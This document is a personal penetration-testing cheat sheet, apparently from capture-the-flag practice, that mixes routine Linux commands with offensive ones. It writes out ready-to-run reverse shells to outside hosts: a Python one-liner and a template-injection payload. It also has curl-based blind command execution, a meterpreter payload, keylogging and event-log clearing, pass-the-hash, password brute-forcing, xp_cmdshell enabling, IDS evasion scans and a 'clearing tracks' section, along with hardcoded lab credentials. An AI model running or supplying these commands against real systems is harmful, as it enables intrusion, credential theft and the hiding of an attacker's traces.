apt-get update && apt-get upgrade

uname -a

sudo apt-get install linux-headers-$(uname -r)

sudo dpkg --remove --force-remove-reinstreq package_name

dpkg --force-all -P packagename

/etc/init.d/nessusd start

sudo rm /var/lib/apt/lists/lock
sudo rm /var/cache/apt/archives/lock
sudo rm /var/lib/dpkg/lock

sudo service apache2 restar
t#/etc/init.d/mysql start
./ngrok http 80 


editcap -F pcap input.cap output.pcap
binwalk -e filename
dd if=example.jpg bs=1 skip=1972141 of=foo.zip
fcrackzip  -u -D -p rockyou.txt famous.zip 


dig +short myip.opendns.com @resolver1.opendns.com

cat /etc/resolv.conf for getting dns server

java -jar steganabara-1.1.1.jar

dd if=/dev/sdb bs=1024 conv=sync,noerror | tee /case123/harddisk.dd |md5sum > /case123/xxxx-harddisk.md5 | sha1sum /case123/xxxx-harddisk.sha1

pdfcrack --wordlist rockyou.txt -f Pdf_name.pdf

steghide extract  -sf Mona.jpg -p Guernica

-------------------------------------------blinr-RCE-curl----------------------------------------------
curl http://192.168.0.12/`whoami`
nc -lvp 80

---------------------------------------http.server-python-------------------------------------
python3 -m http.server 80
python -m SimpleHTTPServer 80 (pss.py)

curl 10.10.16.33/Desktop/LinEnum.sh -o LinEnum.sh "(run this in dev/shm)")

openvpn --config <config file> --route-metric 101

ssh charix@10.10.10.84

-----------------------------------------Network-password-bruteforcing--------------------------------------
SSH:
hydra -l sunny -P rockyou.txt ssh://10.10.10.76:22022

hydra -L users_in_team -p 'CHANGEME' ssh://172.16.64.166:2222


airmon-ng start wlan0
iwconfig

service network-manager restart

airmon-ng stop wlan0mon

pip install -r requirements.txt

hype@Valentine:/etc$ history

cat .bash_history

os.system('clear')

cat /etc/vmware/vmnet8/dhcpd/dhcpd.leases

uniscan -u http://172.16.21.138/ -qweds
----------------------------------mysql----------------------------
systemctl start mysql

mysql -h 10.104.11.198 -u awdmgmt -p
mysql -h 172.16.64.81 -P 13306 -u root -p
mysql -u drupaluser -pPASSWORD -e 'show databases;'
------------------------------------mssql---------------------------
sqsh -S 10.10.10.59 -U sa -P 'GWE3V65#6KFH93@4GWTG2G'

1> EXEC SP_CONFIGURE 'show advanced options', 1
2> go
Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
(return status = 0)
1> EXEC SP_CONFIGURE 'xp_cmdshell', 1
2> reconfigure
3> go
Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
(return status = 0)

-------------------------------rpcbind-------------------------------

apt-get install nfs-common(for rpcinfo and showmount like commands)

nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.39.219

mount -t nfs 10.10.39.219:/var $PWD/mount

-----------------------NMAP--------------------------------------------
nmap --script-updatedb

nmap --script-help default

nmap --script=vuln

nmap 192.168.3-5,7.1 will scan the four addresses 192.168.3.1, 192.168.4.1, 192.168.5.1, and 192.168.7.1

nmap -sV --version-intensity --allports --version-trace

nmap -O -v <IP> (Finding zombie/idle device. check for IP ID Sequence: Incremental)

nmap -sA <IP> -p 445 (filtered means firewall is present. Unfiltered means no firewall)

nmap --scanflags URG 192.168.1.1

"--script=(*smb-vuln*)"

---------------------------------------------------------IDS/firewall-evasion-port-scanning--------------------
Fragment
nmap -sS -f <IP>
nmap -sS <IP> -f --mtu <size> (in multiple of 8)
nmap -f -sS <IP> --data-length 100
nmap -f -f -sS <IP> (16 byte fragment)

Decoy
nmap -sS -D <IP1>,<IP2>,<IP3>,ME <target>

Time
nmap -sS <target> -T[1-5] --max-retries 1

Source_Port
nmap -sS --sorce-port 53 <target_IP>

Spoof MAC
nmap --mac-spoof apple -sS <target_IP>  (--mac-spoof apple,0,<MAC>)

--randomize-hosts

----------------------------------------------------------hping3----------------------------------------
hping3 -S --scan '80,445,500-550,!525' 192.168.1.1 #synscan(RST+ACK=closed  SYN+ACK=open  no response=Firewall/filtered)
hping3 -2 --scan  1-1000 192.168.1.1 (udp scan)
hping3 -F -P -U --scan 1-1000 192.168.1.1 -V (Xmas scan: open ports do not reply. -F Fin, -P push, -U urgent)
hping3 --scan 1-100 192.168.1.1 (TCP null scan withput any TCP flags set)

---------------------------------------------------hping3 idlescan--------------------------------
hping3 -S -r -p 135 10.50.97.10(watch the ID, if it remains +1, then this is good condidate for zombie)

Here we are checking for port 135 on 10.50.97.5. 10.50.97.10 is our zombie host.
hping3 -S -r -p 135 10.50.97.10(if ID is +1 then port is closed, if +2 then port is open)
hping3 -a 10.50.97.10 -S -p 135 10.50.97.5

---------------------------------------------------change mac----------------
ifconfig eth0 down
ifconfig eth0 hw ether 22:33:44:55:66:77

------------------------------------promiscous mode-----------------------
ifconfig eth0 promisc

------------------------------------enable ssh on reboot---------------------
update-rc.d ssh enable
service ssh restart

---------------------get process id of nautilus-------------------------
ps aux | grep nau

------------------------killing process by process id--------------------
kill 16476 

--------------------------------------banner-grabing-http,https/ssl-openssl-----------------------
openssl s_client -connect google.com:443 

nc google.com 80 -v
DNS fwd/rev mismatch: google.com != del03s01-in-f14.1e100.net
google.com [172.217.31.14] 80 (http) open
HEAD / HTTP/1.0

--------------------------------------------tty/stable--------------------------

python -c 'import pty; pty.spawn("/bin/bash")' #interactive shell
python3 -c 'import pty;pty.spawn("/bin/bash")'


------------------------------------------------savetext-to-multiple-files----------------
echo "hello" | tee /tmp/ssh*

--------------------------------------recover ssh password from key file-----------------------
ssh2john id_rsa > id_rsa.hash


----------------------------------------------------xmlrpc.php-payload--------------------------------
<methodCall>
	<methodName>system.listMethods</methodName>
	<params></params>
</methodCall>


---------------------------------------crack pass via shadow file and passwd file-----------------------------
1. convert both the files into john readable format via : unshadow passwd shadow > pass.txt
2.john --wordlist=/usr/share/wordlists/rockyou.txt pass.txt



-------------------------------------------------decode base64 file---------------------------------------------
base64 --decode /tmp/encoded.txt > /tmp/decoded.txt


-------------------------------------------------connect to POP3 via telnet------------------------------------
telnet ip_addr 110 
-----------------------bypassing shell restrictions----------------------------
-----------------------------------------adding a cron service-----------------------------------
crontab -e
@reboot macchanger -m 3C:95:09:9E:B9:3B wlan0

ssh mindy@ip -t "bash --noprofile"

--------------------dumping ssh session---------------------------------------
ssh ctf@138.247.13.114 >>new.txt

-------------------------------------------------------adding new path to env----------------------------------------------
root@ANONYMOUS:~# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin


export PATH=/tmp/apni:$PATH

------------------------------------------chrome as root------------------------------
google-chrome --no-sandbox
chromium --no-sandbox

------------------------------------------on screen navbar----------------------------------
qemu.hw.mainkeys=0

------------------------------------------resetting NW settings in kali------------------------------
service network-manager stop
rm /var/lib/NetworkManager/NetworkManager.state
service network-manager start
nmcli networking off

-------------------------------finding directories with SUID bit permissions--------------------
find / -perm -u=s -type f 2>/dev/null
find / -type f -perm 0777 2>dev/null
find / -perm -4000 2>/dev/null
find / -user root -perm -4000 2>/dev/null
find / -type f -perm -u=s 2>/dev/null | xargs ls -l

-----------------------------------------------------------rdp----------------------------------

rdesktop 172.16.91.100 -u 'AdminELS' -p 'Nu3pmkfyX'

xfreerdp /u:john /v:192.168.1.100 /p:1qaz2wsx /d:hacking
xfreerdp /u:john /d:hacking /v:192.168.1.100 /pth: <ntlmhash>

sudo /etc/init.d/xrdp start

cat myfile | grep B | cut -d " " -f 2

-----------------------------------------list listening processes------------------------------
netstat -tulpn | grep LISTEN

lsof -i -P -n | grep LISTEN

ss -lntp

service cron restart 


--------------------------------uninstalling apps from linux----------------
dpkg --list
apt remove package_name

------------------------------------------------------------------------smb --------------------------------

impacket-smbserver:
impacket-smbserver apnashare $(pwd) -smb2support -user test -password testertest

smbmap -H 192.168.99.162 --download 'WorkSharing\Congratulations.txt'

smbmap -u prtgadmin -p 'PrTg@admin2018' -d netmon -H 10.10.10.152

smbmap -H 10.10.10.192 -d 'BLACKFIELD.local' -u null -p ''

smbmap -H 10.10.62.151 -s <share> -R

smbmap -H  172.30.111.10 -u null
rpcclient -U "" -N 172.30.111.10
enum4linux -U 10.10.62.151

nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.81.226

smbclient -U '%' -N \\\\<IP>\\<SHARE>

smbclient //10.10.81.226/anonymous

smbclient -L 10.10.10.52 -U <username>

smbget -R smb://10.10.81.226/anonymous

smb://user@server/share (nautilus)

mount -t smbfs -o username=<your_username>,password=<your_password> //server/share /mountpoint

mount -t cifs -o username=uname,password=password //192.168.101.7/Ethical_Hacking /mnt/Ethical_Hacking

impacket-psexec admin:a1b2c3d4@10.10.10.20

Bruteforce creds:
crackmapexec smb 10.130.40.70 -u '/mnt/Ethical_Hacking/wordlists/SecLists/Usernames/top-usernames-shortlist.txt' -p '/mnt/Ethical_Hacking/wordlists/SecLists/Passwords/Common-Credentials/best15.txt'

scanner/smb/smb_login

------------------------------------------------------password policy smb------------------------
enum4linux -P 10.10.10.169
crackmapexec smb --pass-pol 10.10.10.169


----------------------------------------------rpcclient-smb---------------------------------------
rpcclient -U support -W blackfield 10.10.10.192
enumdomusers
setuserinfo2 audit2020 23 'test@123'  (change password of a AD user)

------------------------------------------------------llmnr-netbios-poisioning----------------------------
responder -I tap0 -rdwv (turnoff smb and http server in responder conf)

-------------------------------------checking ping requests via tcpdump----------------

tcpdump -i tun0 icmp

----------------------------pgrep----------------------
pgrep wisdom-alt

---------------------------------------------gdb---------------------------------
gdb -p 4185

break wisdom-alt.c:100   //sets break point at line 100

----------------------------------------exiftool---------------------------
ExifTool lets you examine ICC profiles, regardless of whether they are embedded in an image or as stand-alone ".icc" files. It also lets you extract ICC profiles from images and embed them into images.

Extract: exiftool -icc_profile -b -w icc photo.jpg
Embed: exiftool "-icc_profile<=profile.icc" photo.jpg
Examine directly in an image: exiftool -icc_profile:* photo.jpg
Examine an ".icc" file: exiftool profile.icc


---------------------------------find and open ------------------------------------
find . -name \*txt | xargs vim -p

----------------cat -------
cat abc.txt | more
cat abc.txt | less
cat -n abc.txt
-------------------------------------kill paused process------------------------------
kill -kill %1

---------------------------------downloading files with ssh-----------------------
scp username@example.com:/backup/file.zip /local/dir

-------------------------aircrack-ng----------------------------------------------------
aircrack-ng -w gold_star.txt wytshadow.cap

aircrack-ng -b e8:de:27:57:4f:32 inc0gnito.cap

airdecap-ng -w FF:DE:AD:BE:EF inc0gnito.cap

----------------------------------------------------------------------get png from gifs-------------------------------------------
convert gifwala.gif %02.png

----------------------------------------------------------------------get gif from pngs-------------------------------------------

convert -delay 2 -loop 0 *.png animated.gif

---------------------------------------------------------------------------------find command--------------------------------------
find . -name file 2>/dev/null
find / -type d -name filename  2>/dev/null
find . -type f -name *.py 2>/dev/null
find . -type f -name "*.py" 2>/dev/null
find . -type f -perm 0777 -print 2>/dev/null
find -type f -size +99M -exec ls -lh {} \; 2>/dev/null

------------------------------------------------------------converting pcapng to pcap---------------------------------------------------
tcpdump -r pehli.pcapng -w pehli_file.pcap


---------------------------------------------steghide bruteforce----------

for i in $(cat /root/SOTB/sotb_dictionary.txt); do echo '[+] Trying ' $i; steghide extract -sf steg_chall.jpg --passphrase $i; done

--------------------------------------------------------------------cd commands------------------------------
To navigate into the root directory, use "cd /"

To navigate to your home directory, use "cd" or "cd ~"

To navigate up one directory level, use "cd .."

To navigate to the previous directory (or back), use "cd -"


------------------------------------------------------------------run bash with effective userid----------------------------------------
bash -p

---------------------------------------------------------------------space alternative bash----------------------------------
${IFS%??}

--------------------------------------------------sub domain enumeration-----------------------------------------------------------------
1.
2. /massdns/bin/massdns -r massdns/lists/resolvers.txt -t A -o S subdomains.txt -w livehosts.txt
3. sed 's/A.*//' livehosts.txt | sed 's/CN.*//' | sed 's/\..$//' | sort -u > live_subdomains.txt

-----------------------------------------------------------------ssh-tunnel------------------------------------------------------------
ssh -L [Local_port_to_listen_on]:[Remote_Machine]:[Remote_Port] user@ssh_server_ip

sshpass -p bkVBL8Q9HuBSpj ssh -o StrictHostKeyChecking=no  -L 81:127.0.0.1:81 rijndael@kryptos.htb

sshpass -p L1k3B1gBut7s@W0rk ssh -L 8443:127.0.0.1:8443 nadine@10.10.10.184

sshpass -p 12345678 ssh -R "[::]:80:localhost:80" root@34.87.133.72

---------------------------------------------------------------------generate word list from web page-----------------------------------
cewl -w wordlist.txt -d 10 -m 1 http://10.10.10.188/author.html
---------------------------------------------------------------------fuzzing requests-------------------------------------------------
wfuzz -w wordlist.txt -H "HOST: FUZZ.htb" -u http://10.10.10.188/ --hc 400 --hh 8193

--------------------------------------------------------------python library hacking----------------------------------------------------
sudo PYTHONPATH=~/fakelib /opt/scripts/admin_tasks.sh

---------------------------------------------------------------------------python3 reverse shell----------------------------------------


python3 -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.16.64.10",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'


--------------------------------------------------------------adding before text---------------------------------------------------
sed -i '1itask goes here' todo.txt

-------------------------------------------------------------------Fast port scanner-----------------------------------------------
masscan -p1-65535,U:1-65535 10.10.10.175 --rate=1000 -e tun0


-------------------------------------------------------------------------------tar-------------------------------------------------------
To compress

tar -zcvf archive_name.tar.gz folder_to_compress
To extract

tar -zxvf archive_name.tar.gz


-------------------------------------------------------------------------------------ip address without ifconfig-------------------------
netstat -ie

------------------------------------------------unabel to run binary -----------------------------
ldd /usr/local/bin/i686-elf-gcc

-------------------------------------------------enumerate linux binay-------------------------------------

file <binay_name>
ltrace <binay_name>

-------------------------------------------------------------Compile x86 c code in x64 system----------------------------------------
gcc -m 32 -o <compiled> <program.c>

------------------------------------------hashcat----------------------------------
hashcat --help | grep NTLM --example-hashes
hashcat -m 5600 ntlmhash.txt /mnt/hgfs/D/wordlists/rockyou.txt --force (ntlmv2 responder hashes)

hashcat -r /usr/share/hashcat/rules/best64.rule --stdout custom.list

---------------------------------------------------live_host_detection/host_discovery-------------------------------
ARP:
nmap -PR 172.16.5.101/24 -n -sn -v -oG - | awk '/Up$/{print $2}'
arp-scan -l  --interface tap0
scanner/discovery/arp_sweep

ICMP echo:
fping -a -g 10.142.111.240/24 2>/dev/null
fping -a -g 10.142.111.240/24 -A -q
nmap -sn 10.142.111.240/24 --disable-arp-ping --send-ip
netdiscover -i eth0
nmap 192.168.211.129/24 -sn
nmap 10.50.96.0/23 -Pn --top-ports=10 -T5 -n --open --source-port 53

hping3 --icmp-ts 192.168.1.1 -c 3 -V (ICMP time request)

hping3 -2 192.168.1.1 -c 3 -V  (Sends udp packet to port 0)

-----------------------------------------------------------DNS-Enumeration(+nocookie is only for windows dns servers)----------------------------------------
Finding dns servers:
nmap -iL live_hosts_port_scan -p U:53,T:53 -sU -sS --open
nmap -iL live_hosts_port_scan -p U:53,T:53 -sU -sS --open --source-port 53


Determine the Domain Name:
nmap -iL fping_live_hosts -Pn --disable-arp-ping -sL -v  --dns-servers 172.16.5.10
nmap -iL fping_live_hosts -Pn --disable-arp-ping -sn -v  --dns-servers 172.16.5.10
nmap -iL fping_live_hosts -Pn --disable-arp-ping -sn -R -v --dns-servers 172.16.5.10
nmap 172.16.5.1/24 -sL --dns-servers 172.16.5.10

dig @172.16.5.10 -x 172.16.5.10 +nocookie  (reverse lookup)

#nslookup
> server 172.16.5.10
Default server: 172.16.5.10
Address: 172.16.5.10#53
> 172.16.5.10
10.5.16.172.in-addr.arpa        name = els-winser2003.sports.com.

Zone transfer:
dig @172.16.5.10 sportsfoo.com AXFR +nocookie +noall +answer +nocmd

nmap --script dns-zone-transfer.nse  --script-args dns-zone-transfer.server=172.16.5.10,dns-zone-transfer.domain=sportsfoo.com

host -t axfr sportsfoo.com 172.16.5.10

dig(+nocookie +noall +answer +nocmd)
dig @10.50.96.5 foocampus.com ANY +nocookie

dig @10.50.96.5 foocampus.com AXFR +nocookie  (zone transfer)

host -t axfr foocampus.com 10.50.96.5  (zone transfer)

nslookup -type=any zonetransfer.me    // gives all the dns records for host zonetransfer.me

host -t ns zonetransfer.me 			  // gives name server records for host zonetransfer.me
host -l zonetransfer.me nsztm2.digi.ninja  //lists all hosts in a domain, using AXFR

dig axfr zonetransfer.me @nsztm2.digi.ninja

via nslookup :
C:\Users\pswalia>nslookup
Default Server:  UnKnown
Address:  49.45.0.5

> server nsztm1.digi.ninja4
*** Can't find address for server nsztm1.digi.ninja4: Non-existent domain
> server nsztm1.digi.ninja
Default Server:  nsztm1.digi.ninja
Address:  81.4.108.41

> ls -d zonetransfer.me

via dnsrecon:
dnsrecon -d zonetransfer.me -t axfr

-----------------------------------------------------snmp---------------------------------------------
Find community string:
nmap -iL livehosts_total -p U:161,162 -sU --open (Finding hosts with snmp service)
onesixtyone -c dict.txt 10.10.10.5

Enumeration:
snmpwalk -v 1 -c private 10.10.10.5
nmap -p 161 -sU -sV --version-intensity 9 -sC --script=snmp-*.nse -n -Pn -v -oN nse_scripts_snmp 10.10.10.5

dos2unix *.txt
./snmpenum.pl 10.10.10.5 private windows.txt > snmpenum.out



-----------------------------------------------------------arp-cache--------------------------------------
ip neighbour

------------------------------------------------------------/etc/passwd-----------------------------------------
cat /etc/passwd | column -t -s ":"

------------------------------------------------------grep,awk text/string filtering-------------------------------
awk -F \[ '{print $2}' 

cat file.txt | awk 'length($0) > 3' (filter lines greater then 3 characters)

grep -R text *   //find text in all files recursively
grep -i -e 'password' -e 'pwd' -e 'passwd' (multiple strings)
grep -v 'password' (invert match)
xargs (Converts multiline output to space seperated)
tr(text replace)

-------------------------------------wireshark-filters------------------------------------
tcp contains "elsfoo"

---------------------------------------recursive netcat-------------------------------
while true; do nc -lvp 88 ; done

----------------------------------------masscan------------------------------------------------------------------

masscan -p1-65535,U:1-65535 10.10.10.x --rate=1000 -e tun0

masscan 172.17.80.100 -p1-65535,U:1-65535 --rate 1000 --interface tap0 --router-ip 175.13.80.1

--------------------------------------------------SSTI_rev_shell-------------------------------

{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c  'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.15.60\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\");'").read().zfill(417)}}{%endif%}{% endfor %}


-----------------------------------------------------------copy piping something to clipboard-----------------------------------------
| xclip -sel clipboard


------------------------------------------------------------tmux---------------------------------------------
ctrl+b % (vertical pane)
ctrl+b " (horizontal pane)
ctrl+b c (new window)
ctrl+b , (rename window)
ctrl+b [ (scroll)
tmux ls (sessions)
ctrl+b d (detach session)
tmux new -s <session_name>
tmux rename-session -t 0 git (rename session)
tmux kill-session -t 0
tmux attach-session -t 1
tmux kill-window -t 2

------------------------------------------------------------git---------------------------------
git pull origin master (update local  git repo with github)
-------------------------------------------------ping ttl os detection--------------------------------

ttl<=64 Linux
ttl<=128 Windows
ttl>128 network devices

---------------------------------------------------ldapsearch------------------------------------------
ldapsearch -x -b "DC=htb,DC=local" -h 10.10.10.161

------------------------------------------------resetting neo4j password:ruby-benny-mixer-change-consul-1148------------------------------

locate neo4j | grep auth

------------------------------------------------------evil-winrm(5985)---------------------------------------

evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice

evil-winrm -c certnew.cer -k amanda.key -i 10.10.10.103 -u amanda -p Ashare1972

-------------------------------------------------------crackmapexec-------------------------------------------

crackmapexec {smb,winrm} 192.168.211.0/24 -u fcastle -d MARVEL.local -p Password1

crackmapexec {smb,winrm} 192.168.211.0/24 -u fcastle -d MARVEL.local -p Password1 --sam

crackmapexec smb <target(s)> -u username -H LMHASH:NTHASH

crackmapexec smb <target(s)> -u username -H NTHASH

crackmapexec smb 10.10.10.20 -u admin -p a1b2c3d4 -x whoami

------------------------------------------------------open .db sqlite3 files-------------------------
sqlite3 Audit.db .dump


-------------------------------------------------stuck ssh --------------------------------------
press Enter then ~  then .

-------------------------------------------------------network-manager----------------------------

sudo dhclient eth0

---------------------------------------------------------------clearing tracks---------------------------------

"/var/log/auth.log" (Attempted logins for SSH, changes too or logging in as system users:)
"/var/log/syslog" (System events such as firewall alerts:)
"/var/log/apache2/access.log"



--------------------------------------------------------SSRF-----------------------------------------
<subdomain>.localtest.me  (resolves to 127.0.0.1)

---------------------------------------------------------------------------mount-shared-folders--------------------------------------------
add
vmhgfs-fuse /mnt/hgfs fuse defaults,allow_other 0 0

to /etc/fstab

Then reboot, or sudo mount -a

-------------------------------------------------------watch----------------------------------
watch -n 1 'ls -la'

---------------------------------------------------smtp----------------------------------------------

telnet 10.10.10.77 25

EHLO 10.10.10.77

Mail from: test@megabank.com
250 OK
RCPT To: nico@megabank.com
250 OK(shows email exists)

Mail from: test@megabank.com
250 OK
RCPT To: random@megabank.com  
550 Unknown user  (shows email does  not exist)

-------------------------------------------------vnc-gui---------------------------------
xhost +

------------------------------------------------routing table----------------------------------
ip route

----------------------------------------------run_binary_in_background-------------------------------
./<name_of_binary>&

-----------------------------------------------msfvenom--------------------------------------
msfvenom -p windows/x64/meterpreter_reverse_https lport=443 lhost=192.168.2.1 -f psh-reflection > payload.ps1

--------------------------------------------------msfconsole------------------------------
msf6 > search type:exploit platform:windows

--------------------------------------------------meterpreter--------------------------
meterpreter > edit file.txt
meterpreter > execute -f cmd.exe -i H
meterpreter > search -f secret.*
meterpreter > ps
meterpreter > getpid

meterpreter > migrate <pid>
meterpreter > run post/windows/manage/migrate

meterpreter > keyscan_start
meterpreter > keyscan_dump

meterpreter > clearev

meterpreter > portfwd add -l 3306 -p 3306 -r 127.0.0.1

run post/multi/recon/local_exploit_suggester SHOWDESCRIPTION=true

msf6 > load nessus
msf6 > nessus_connect Nessus:Nessus@127.0.0.1:8834 ssl_verify
msf6 > nessus_help
msf6 > nessus_scan_list
msf6 > nessus_db_import <scan id>
msf6 > nessus_report_hosts <scan_id>
msf6 > nessus_report_vulns <scan_id>
msf6 > nessus_db_import <scan_id>
msf6 > services

copy plugin to /root/.msf4/plugins (add <plugin>.rb here)
msf6 > load plugin
msf6 > vuln_exploit

set AutoRunScript migrate -n svchost.exe # to automatically migrate while we get meterpreter session

-----------------------------------metasploit-------------------------------
ctrl+z --> to run session in background
sessions -l --> to list all the active sessions
----------------------------------metasploit .rc scripts---------------------------
msfconsole -r /var/lib/veil/output/handlers/payload1.rc